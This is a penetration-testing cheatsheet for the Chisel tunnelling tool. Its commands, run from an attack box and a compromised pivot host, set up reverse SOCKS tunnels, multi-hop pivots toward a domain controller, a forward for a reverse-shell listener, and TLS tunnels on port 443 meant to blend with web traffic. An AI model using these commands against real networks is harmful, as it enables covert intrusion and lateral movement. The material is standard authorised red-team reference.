# Chisel Pivoting Cheatsheet

**Chisel** is a fast TCP/UDP tunnel over HTTP, secured via SSH. Perfect for firewall traversal and pivoting in red team engagements.

## Installation

[Chisel (release)](https://github.com/jpillora/chisel/releases)

```bash
# Download for Linux (attacker/pivot)
wget https://github.com/jpillora/chisel/releases/latest/download/
gunzip chisel_x.x.x_linux_amd64.gz
chmod +x chisel_x.x.x_linux_amd64
```

## Basic SOCKS5 Tunnel

Standard tunnel where your attack box acts as the **server** (listener), and the compromised pivot is the **client**.

```bash
# Attack Box (Server) - listens for connections
chisel server -v -p $SERVER_PORT --socks5

# Pivot Host (Client) - connects back
chisel client -v $SERVER_IP:$SERVER_PORT socks
```

## Reverse SOCKS5 Tunnel

**Use when:** The pivot host cannot initiate outbound connections to your attack box (firewall restrictions). The server runs in reverse mode.

```bash
# Attack Box (Server with reverse flag)
chisel server --reverse -v -p $SERVER_PORT --socks5

# Pivot Host (Client) - creates reverse SOCKS tunnel
chisel client -v $SERVER_IP:$SERVER_PORT R:socks
```

The `R:` prefix indicates a **reverse** tunnel. SOCKS5 proxy will be available on your attack box at `127.0.0.1:1080`.

## Multi-Hop Pivoting (Deep Network Traversal)

Access networks behind multiple firewalls by chaining tunnels through intermediate hosts.

### Scenario

```
Attack Box (10.10.14.227) -> DMZ01 (10.129.58.6 | 172.16.8.120) -> DC01 (172.16.8.3 | 172.16.9.3) -> MGMT01 (172.16.9.25)
```

### Step 1: First Hop (Attack Box ↔ DMZ01)

```bash
# Attack Box - Main server
chisel server --socks5 -p 9001 --reverse

# DMZ01 - Connect first SOCKS tunnel
chisel client $SERVER_IP:9001 R:1080:socks
```

### Step 2: Second Hop (DMZ01 <-> DC01)

```bash
# DMZ01 - Acts as a server for the next hop
chisel server -p 9002 --reverse --socks5

# DC01 - Connect through DMZ01 using first hop as proxy
chisel client --proxy socks5://172.16.8.120:1080 $SERVER_IP:9001 R:1081:socks
```

### Step 3: Access Target Network

Now `127.0.0.1:1080` reaches DMZ01's network, and `127.0.0.1:1081` reaches beyond DC01.

```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081

# Scan through second hop
proxychains nmap -sT -Pn 172.16.9.25
```

## Port Forwarding

### Standard Port Forward (Attacker -> Target)

Expose a service from the target to your attack box.

```bash
# Pivot Host (Server)
chisel server -p $SERVER_PORT

# Attack Box (Client) - forward target's port 80 to localhost:8080
chisel client $SERVER_IP:$SERVER_PORT 8080:$TARGET_IP:80
```

### Reverse Port Forward (Target -> Attacker)

Expose a service **from your attack box** to the target's network.

```bash
# Attack Box (Server in reverse mode)
chisel server --reverse -p $SERVER_PORT

# Pivot Host (Client) - expose attacker's port 4444 as 4444 on pivot
chisel client $SERVER_IP:$SERVER_PORT R:4444:0.0.0.0:4444
```

**Use case:** You have a listener on your attack box (e.g., reverse shell handler). The target cannot reach you directly. The pivot host exposes your listener to its internal network.

## Multiple SOCKS Tunnels on Different Ports

```bash
# Attack Box - Single server handles all
chisel server --reverse -p 8080 --socks5

# Pivot A - tunnel on port 1080
chisel client $SERVER_IP:8080 R:1080:socks

# Pivot B - tunnel on port 1081
chisel client $SERVER_IP:8080 R:1081:socks
```

### Proxychains with multiple tunnels

```bash
# /etc/proxychains4.conf - strict chain for hop-by-hop
strict_chain
socks5 127.0.0.1 1080  # First network
socks5 127.0.0.1 1081  # Second network (deeper)
```

## Authentication & Security

### Server with Authentication

```bash
# Create users.json
cat > users.json << EOF
{
  "admin": "SuperSecurePass123",
  "operator": "RedTeam2024"
}
EOF

# Start server with auth
chisel server --port 8080 --authfile users.json --socks5

# Client connects with credentials
chisel client --auth admin:SuperSecurePass123 $SERVER_IP:8080 socks
```

### Inline Authentication

```bash
# Server with single user
chisel server --port $SERVER_PORT --auth $CHISEL_USER:$CHISEL_PASS --socks5

# Client inline
chisel client --auth $CHISEL_USER:$CHISEL_PASS $SERVER_IP:$SERVER_PORT socks
```

### Fingerprint Pinning

```bash
# Generate server key (first run)
chisel server --keygen

# Server with key
chisel server --port $SERVER_PORT --keyfile ~/.chisel/chisel.key

# Client with fingerprint verification
chisel client --fingerprint "rHb55mcxf6vSckL2AezFV09rLs7pfPpavVu++MF7AhQ=" $SERVER_IP:$SERVER_PORT socks
```

## Over HTTPS (TLS)

> Chisel uses WebSockets over HTTP, making it extremely firewall-friendly. Always test your tunnel with `proxychains curl` before running heavy scans.

Hide your tunnel in encrypted web traffic.

### Self-Signed Certificate

```bash
# Generate cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Server with TLS
chisel server --port 443 --tls-key key.pem --tls-cert cert.pem --socks5

# Client with TLS (skip verification for self-signed)
chisel client --tls-skip-verify https://$SERVER_IP:443 socks
```

### Production/Valid Certificate

```bash
chisel server --port 443 --tls-domain chisel.yourdomain.com --socks5
chisel client https://chisel.yourdomain.com:443 socks
```

## Advanced: SOCKS5 Through Upstream Proxy

Use when the pivot host must reach your server via a corporate proxy.

```bash
# Client connects through HTTP CONNECT proxy
chisel client --proxy $PROXY_IP:$PROXY_PORT $SERVER_IP:$SERVER_PORT socks

# Client connects through SOCKS5 proxy
chisel client --proxy socks5://$PROXY_IP:$PROXY_PORT $SERVER_IP:$SERVER_PORT socks
```

## Useful Command Combinations

### Remote Desktop Through Tunnel

```bash
proxychains xfreerdp /v:$TARGET_IP /u:$USER /p:$PASSWORD
```

### SSH Through Tunnel

```bash
proxychains ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@$TARGET_IP
```

### File Transfer via HTTP Through Tunnel

```bash
# On pivot (upload to your server)
chisel client $SERVER_IP:$SERVER_PORT R:8000:0.0.0.0:8000
# Your attack box serves file on port 8000
python3 -m http.server 8000
# Pivot downloads: curl http://127.0.0.1:8000/tool.sh
```
